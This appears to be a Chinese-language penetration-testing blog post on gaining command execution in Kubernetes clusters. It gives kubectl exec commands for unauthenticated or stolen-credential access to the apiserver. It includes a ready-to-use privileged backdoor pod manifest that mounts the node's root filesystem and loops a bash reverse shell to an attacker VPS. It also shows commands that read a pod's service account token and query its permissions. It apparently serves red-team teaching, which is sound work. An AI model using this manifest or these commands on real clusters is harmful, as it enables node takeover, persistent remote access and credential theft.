---
title: "K8s渗透-执行"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# K8s渗透-执行

> 文章首发于track安全社区：[K8s渗透入门从零到一](https://bbs.zkaq.cn/t/32483.html)

执行阶段的主要任务是实现在集群内执行任意命令，获得shell

## kubectl exec进入容器

当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：

~~~sh
# apiserver未授权时
kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash

# 获取到kubeconfig文件时
kubectl --kubeconfig config --namespace=default exec -it test-rev -- bash

# 获取到高权限token时
kubectl --server=https://x.x.x.x:6443 --token="<token值>" --insecure-skip-tls-verify --namespace=default exec -it test-rev -- bash
~~~

比如这里进入容器执行反弹shell命令

![QQ_1755101935584](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101935584.png)

成功监听到反弹shell：

![QQ_1755101972156](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101972156.png)

## 创建后门pod

获取初始访问权限后，通过创建后门pod来执行后续攻击，

首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：

~~~yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-rev
spec:
  nodeName: <节点名称>
  containers:
  - name: test-container
    image: ubuntu
    command: ["/bin/sh"]
    args:
      - "-c"
      - |
        apt update && apt install -y bash netcat-openbsd && \
        bash -c 'while true; do bash -i >& /dev/tcp/<你的vps的公网IP>/2333 0>&1; sleep 60; done'
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
    securityContext:
      privileged: true
  volumes:
  - name: test-volume
    hostPath:
      path: /
~~~

然后使用 kubectl 创建文件指定的恶意容器：

~~~
kubectl -s x.x.x.x:8080 create -f test.yaml
~~~

![QQ_1752337573510](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337573510-20250714002417620.png)

>**注意**，这里如果想要指定在哪个node上创建容器（只有状态为ready的node可以创建并running），可以直接在yaml中增加nodeName字段：
>
>~~~yaml
>spec:
>nodeName: <节点名称>
>~~~
>
>我们其实也可以通过上面提到的kubectl exec直接进入容器的shell：
>
>~~~sh
>kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash
>~~~
>

在创建成功后，容器会自动向我们监听的vps反弹shell：

![QQ_1752337659881](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337659881-20250714002417907.png)

因为我们将节点的根目录挂载到了容器的`/mnt`目录，所以我们可以通过操作pod的`/mnt`目录来操作node的根目录：

![QQ_1752337790318](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714002609563.png)

## 服务账号连接API Server执行指令

k8s的账号分为用户账号和服务账号，用户账号提供给用户来操作集群，服务账号用于pod中运行的进程，为pod中运行的应用或服务提供身份，由k8s API自动创建并由API server进行认证，k8s的pod中默认携带服务账号的访问凭证，每个服务账号均会自动关联一个API访问令牌，那么如果我们控制的pod中存在高权限的服务账号，我们就可以在pod中通过该账号凭证向k8s下发指令

服务账号在pod内的默认路径如下：

~~~sh
/var/run/secrets/kubernetes.io/serviceaccount/
~~~

![QQ_1755186066353](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755186066353.png)

我们可以携带这里的token向apiserver发送一个SelfSubjectRulesReview请求，可以知道当前服务账号在指定命名空间（这里以default为例）的操作权限：

~~~sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -sk --header "Authorization: Bearer $TOKEN" --cacert $CA_CERT -H "Content-Type: application/json" -X POST https://x.x.x.x:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
~~~

![QQ_1755339078336](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755339078336.png)

如果返回的json中列出来是较高的权限，我们可以使用这个服务账户的token来远程控制apiserver（网传可以curl请求apiserver的借口来执行命令，但我失败了，似乎是因为这里不能使用常规http来请求借口，而需要SPDY或者websocket，所以我认为使用kubectl来完成对kubectl的控制更方便）：

![QQ_1755343454008](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755343454008.png)

那么后面的操作就和上文一样，可以创建后门pod并挂载node根目录实现对node节点的访问或者逃逸（逃逸在后面的文章总结）

## 未开启RBAC权限

RBAC(Role-Based Access Control)是k8s中用于控制访问权限的一种策略，它允许管理员定义角色和角色绑定，以及分配这些角色给用户或服务账号，以此来限制他们对集群的访问和操作权限

我们可以通过在master节点上执行命令，查看apiserver的启动参数是否有`--authorization-mode=RBAC`，以此查看是否开启了RBAC权限：

~~~sh
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep authorization-mode
~~~

![QQ_1755358930320](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755358930320.png)

或者：

~~~sh
ps -ef | grep authorization-mode
~~~

![QQ_1755359606268](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755359606268.png)

只要有这个参数，则代表开启了RBAC权限

如果没有开启RBAC权限，代表我们可以使用k8s中任意经过认证的token实现对k8s apiserver的控制，那么思路就和上面连接API server执行是一样的了，当我们获得了pod的shell，可以尝试读取`/var/run/secrets/kubernetes.io/serviceaccount/token`获得token，然后直接使用curl或者kubectl调用apiserver，创建后门pod并逃逸来控制节点

## 不安全的容器镜像

这个在前面文章k8s面临的风险中也提到过，如果容器本身存在漏洞，则很容易成为入口点，比如笔者遇到过的一个攻防场景，pod上运行的zabbix在公网存在弱口令，进入后台可以RCE导致pod被接管，后续进行一系列横向和逃逸，成功接管了整个k8s

## 总结

从上面的这些方法来看，执行这一步的目标就利用传统安全漏洞、token、apiserver原有命令等手段，在pod上实现命令执行或者能够获得apiserver的控制权，为接下来的权限提升（即逃逸）做准备
